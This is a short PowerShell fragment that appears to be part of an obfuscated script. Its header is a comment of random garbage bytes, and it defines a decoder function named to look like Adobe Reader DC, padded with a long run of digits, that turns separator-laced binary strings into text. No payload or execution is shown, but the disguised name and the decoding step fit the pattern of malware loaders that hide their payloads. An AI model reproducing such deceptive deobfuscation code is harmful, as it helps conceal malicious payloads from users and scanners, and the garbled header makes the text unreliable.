# Ÿ™.Y×Af-ë}Õ=C'ÃGn¤[uÿéO²¯“@øà–ý¦Î—ˆÿÆ !L,¶ë~ûÛßàWò¼÷ˆy€Øî=fç…qŒ” ìWð±œ
# ä=Ì
[scriptblock]$FriendlyTimeSpanToString = { '{0:0.0000}ms' -f ($this.Ticks / 10000.0) }

function AdoberReaderDC08090809808203909820394809285098203598098029850987874098475870485720847098274058274058274058720872048572048 {
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$BinaryInput
    )


    $cleanedBinaryInput = $BinaryInput -replace '100110011001_100110011001_100110011001_100110011001', ''

    # Quebra em blocos de 8 bits e converte cada um em caractere
    $decimalValues = $cleanedBinaryInput -split '(?<=\G.{8})' |
                     Where-Object { $_.Length -eq 8 } |
                     ForEach-Object { [char][Convert]::ToInt32($_, 2) }

    # Retorna string final
    return -join $decimalValues
}
